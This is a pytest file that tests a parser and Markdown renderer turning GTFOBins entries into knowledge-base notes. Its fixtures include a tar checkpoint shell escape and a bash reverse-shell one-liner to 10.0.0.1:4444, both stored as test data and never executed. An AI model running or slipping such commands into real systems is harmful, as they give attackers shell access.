from pathlib import Path

import yaml

from src.kb_builder.paths import ProjectPaths
from src.kb_builder.render.markdown import MarkdownRenderer
from src.kb_builder.sources.gtfobins import GtfobinsSource


class DummyLogger:
    def info(self, *args, **kwargs):
        pass

    def warning(self, *args, **kwargs):
        pass

    def debug(self, *args, **kwargs):
        pass


def test_gtfobins_source_parses_local_markdown_directory(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    data_dir = tmp_path / "gtfobins"
    data_dir.mkdir()
    (data_dir / "tar.md").write_text(
        """---
functions:
  shell:
    - code: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
      description: It spawns an interactive shell.
  file-read:
    - code: tar xf archive.tar -O
---
Extra source notes.
""",
        encoding="utf-8",
    )

    source = GtfobinsSource(config={"local_path": "gtfobins"}, logger=DummyLogger())
    tools = source.parse(source.load())

    assert len(tools) == 1
    assert tools[0].id == "tar"
    assert tools[0].path == "kb/gtfobins/tools/tar.md"
    assert tools[0].functions == ["file-read", "shell"]
    assert tools[0].function_examples[1].description == "It spawns an interactive shell."


def test_gtfobins_source_parses_extensionless_yaml_document(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    data_dir = tmp_path / "gtfobins"
    data_dir.mkdir()
    (data_dir / "bash").write_text(
        """---
functions:
  shell:
    - code: bash
      comment: It spawns an interactive shell.
...
""",
        encoding="utf-8",
    )

    source = GtfobinsSource(config={"local_path": "gtfobins"}, logger=DummyLogger())
    tools = source.parse(source.load())

    assert len(tools) == 1
    assert tools[0].id == "bash"
    assert tools[0].functions == ["shell"]
    assert tools[0].function_examples[0].description == "It spawns an interactive shell."


def test_render_gtfobins_writes_tool_and_index(tmp_path, monkeypatch):
    repo_root = Path.cwd()
    monkeypatch.chdir(tmp_path)
    data_dir = tmp_path / "gtfobins"
    data_dir.mkdir()
    (data_dir / "bash.md").write_text(
        """---
functions:
  shell:
    - code: bash
      description: It can spawn an interactive shell.
  reverse-shell:
    - code: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
---
Body content.
""",
        encoding="utf-8",
    )

    source = GtfobinsSource(config={"local_path": "gtfobins"}, logger=DummyLogger())
    tools = source.parse(source.load())
    monkeypatch.chdir(repo_root)
    renderer = MarkdownRenderer(
        config={"rendering": {"parsed_marker": "focuslocust"}},
        paths=ProjectPaths(
            vault_path=tmp_path / "vault",
            cache_path=tmp_path / ".cache",
            log_path=tmp_path / ".logs",
        ),
        logger=DummyLogger(),
    )

    written, skipped = renderer.render_gtfobins(tools)

    assert written == 2
    assert skipped == 0

    tool_note = (tmp_path / "vault/kb/gtfobins/tools/bash.md").read_text(encoding="utf-8")
    assert "parsed_by: focuslocust" in tool_note
    assert "source: gtfobins" in tool_note
    assert "# bash" in tool_note
    assert "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" in tool_note
    assert "Body content." in tool_note
    frontmatter = yaml.safe_load(tool_note.split("---", 2)[1])
    assert set(frontmatter["functions"]) == {"shell", "reverse-shell"}

    index = (tmp_path / "vault/kb/indexes/gtfobins.md").read_text(encoding="utf-8")
    assert "[[kb/gtfobins/tools/bash|bash]]" in index
